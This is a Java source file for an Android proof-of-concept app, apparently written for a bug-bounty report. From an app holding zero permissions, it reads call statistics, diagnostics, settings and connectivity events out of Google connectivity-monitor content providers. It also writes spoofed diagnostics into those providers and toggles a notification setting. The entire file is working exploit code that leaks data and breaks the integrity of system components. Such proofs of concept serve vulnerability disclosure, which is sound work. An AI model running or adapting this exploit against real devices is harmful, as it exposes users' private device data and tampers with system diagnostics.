package com.vrp.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class SconeProviderLeakActivity extends Activity {
    private static final String TAG = "VRP_SCONE";

    private static final String TROUBLESHOOTER_AUTH = "com.google.android.connectivitymonitor.troubleshooterprovider";
    private static final String CONNECTIVITY_HELPER_AUTH = "com.google.android.connectivitymonitor.connectivityhelperprovider";
    private static final String NIMBUS_AUTH = "com.google.android.apps.scone.connectivitymonitor.nimbusprovider";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(10f);
        sv.addView(tv);
        setContentView(sv);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== Scone Provider Zero-Permission Exploit ===\n");
            sb.append("PoC app UID: ").append(android.os.Process.myUid()).append("\n\n");

            readTroubleshooter(sb);
            sb.append("\n");
            readConnectivityHelper(sb);
            sb.append("\n");
            writeTroubleshooter(sb);
            sb.append("\n");
            writeConnectivityHelper(sb);
            sb.append("\n");
            readNimbus(sb);

            final String result = sb.toString();
            Log.i(TAG, result);
            runOnUiThread(() -> tv.setText(result));
        }).start();
    }

    private void readTroubleshooter(StringBuilder sb) {
        sb.append("--- TROUBLESHOOTER READ (zero-permission) ---\n");
        ContentResolver cr = getContentResolver();

        try {
            sb.append("[call_statistics]\n");
            Cursor c = cr.query(Uri.parse("content://" + TROUBLESHOOTER_AUTH + "/call_statistics"),
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String key = c.getString(0);
                    String val = c.getString(1);
                    sb.append("  ").append(key).append(" = ").append(val).append("\n");
                    Log.i(TAG, "TROUBLESHOOTER_STATS: " + key + " = " + val);
                }
                c.close();
            }
        } catch (Exception e) {
            sb.append("  ERROR: ").append(e.getMessage()).append("\n");
        }

        try {
            sb.append("[diagnostics]\n");
            Cursor c = cr.query(Uri.parse("content://" + TROUBLESHOOTER_AUTH + "/diagnostics"),
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String key = c.getString(0);
                    String val = c.getString(1);
                    sb.append("  ").append(key).append(" = ").append(val).append("\n");
                    Log.i(TAG, "TROUBLESHOOTER_DIAG: " + key + " = " + val);
                }
                c.close();
            }
        } catch (Exception e) {
            sb.append("  ERROR: ").append(e.getMessage()).append("\n");
        }
    }

    private void readConnectivityHelper(StringBuilder sb) {
        sb.append("--- CONNECTIVITY HELPER READ (zero-permission) ---\n");
        ContentResolver cr = getContentResolver();
        try {
            Cursor c = cr.query(Uri.parse("content://" + CONNECTIVITY_HELPER_AUTH + "/settings"),
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String key = c.getString(0);
                    String val = c.getString(1);
                    sb.append("  ").append(key).append(" = ").append(val).append("\n");
                    Log.i(TAG, "CONN_HELPER: " + key + " = " + val);
                }
                c.close();
            }
        } catch (Exception e) {
            sb.append("  ERROR: ").append(e.getMessage()).append("\n");
        }
    }

    private void writeTroubleshooter(StringBuilder sb) {
        sb.append("--- TROUBLESHOOTER WRITE (zero-permission INTEGRITY VIOLATION) ---\n");
        ContentResolver cr = getContentResolver();
        try {
            ContentValues cv = new ContentValues();
            cv.put("diagnosis", "INJECTED_BY_MALICIOUS_APP");
            cv.put("network_id", "SPOOFED_NETWORK_123");
            cv.put("confidence", "HIGH");
            cv.put("actions", "FAKE_ACTION_REBOOT");
            cr.insert(Uri.parse("content://" + TROUBLESHOOTER_AUTH + "/diagnostics"), cv);
            sb.append("  WRITE SUCCESS — injected fake diagnostics data\n");
            Log.i(TAG, "WRITE_SUCCESS: injected fake diagnostics");

            Cursor c = cr.query(Uri.parse("content://" + TROUBLESHOOTER_AUTH + "/diagnostics"),
                    null, null, null, null);
            if (c != null) {
                sb.append("  Verification after write:\n");
                while (c.moveToNext()) {
                    String key = c.getString(0);
                    String val = c.getString(1);
                    sb.append("    ").append(key).append(" = ").append(val).append("\n");
                    Log.i(TAG, "AFTER_WRITE: " + key + " = " + val);
                }
                c.close();
            }
        } catch (Exception e) {
            sb.append("  ERROR: ").append(e.getMessage()).append("\n");
        }
    }

    private void writeConnectivityHelper(StringBuilder sb) {
        sb.append("--- CONNECTIVITY HELPER WRITE (zero-permission INTEGRITY VIOLATION) ---\n");
        ContentResolver cr = getContentResolver();
        try {
            sb.append("  Before write:\n");
            Cursor c = cr.query(Uri.parse("content://" + CONNECTIVITY_HELPER_AUTH + "/settings"),
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    sb.append("    ").append(c.getString(0)).append(" = ").append(c.getString(1)).append("\n");
                }
                c.close();
            }

            ContentValues cv = new ContentValues();
            cv.put("on_device_notifications", "off");
            cr.insert(Uri.parse("content://" + CONNECTIVITY_HELPER_AUTH + "/settings"), cv);
            sb.append("  WRITE SUCCESS — disabled on_device_notifications\n");
            Log.i(TAG, "WRITE_SUCCESS: disabled notifications");

            sb.append("  After write:\n");
            c = cr.query(Uri.parse("content://" + CONNECTIVITY_HELPER_AUTH + "/settings"),
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    sb.append("    ").append(c.getString(0)).append(" = ").append(c.getString(1)).append("\n");
                    Log.i(TAG, "AFTER_WRITE: " + c.getString(0) + " = " + c.getString(1));
                }
                c.close();
            }

            cv = new ContentValues();
            cv.put("on_device_notifications", "on");
            cr.insert(Uri.parse("content://" + CONNECTIVITY_HELPER_AUTH + "/settings"), cv);
            sb.append("  REVERTED on_device_notifications back to on\n");
        } catch (Exception e) {
            sb.append("  ERROR: ").append(e.getMessage()).append("\n");
        }
    }

    private void readNimbus(StringBuilder sb) {
        sb.append("--- NIMBUS CONNECTIVITY EVENTS (zero-permission, Bundle query) ---\n");
        ContentResolver cr = getContentResolver();
        try {
            Bundle queryArgs = new Bundle();
            queryArgs.putInt("android:query-arg-limit", 50);
            queryArgs.putInt("android:query-arg-offset", 0);
            Cursor c = cr.query(
                    Uri.parse("content://" + NIMBUS_AUTH + "/connectivityevents"),
                    null, queryArgs, null);
            if (c != null) {
                sb.append("  Rows returned: ").append(c.getCount()).append("\n");
                sb.append("  Columns: ");
                for (String col : c.getColumnNames()) {
                    sb.append(col).append(", ");
                }
                sb.append("\n");
                int row = 0;
                while (c.moveToNext() && row < 20) {
                    sb.append("  Row ").append(row).append(": ");
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        String col = c.getColumnName(i);
                        int type = c.getType(i);
                        if (type == Cursor.FIELD_TYPE_BLOB) {
                            byte[] blob = c.getBlob(i);
                            sb.append(col).append("=BLOB(").append(blob != null ? blob.length : 0).append("B) ");
                        } else {
                            sb.append(col).append("=").append(c.getString(i)).append(" ");
                        }
                    }
                    sb.append("\n");
                    Log.i(TAG, "NIMBUS_EVENT row " + row);
                    row++;
                }
                c.close();
            } else {
                sb.append("  Cursor is null\n");
            }
        } catch (Exception e) {
            sb.append("  ERROR: ").append(e.getMessage()).append("\n");
            Log.e(TAG, "Nimbus query error", e);
        }
    }
}
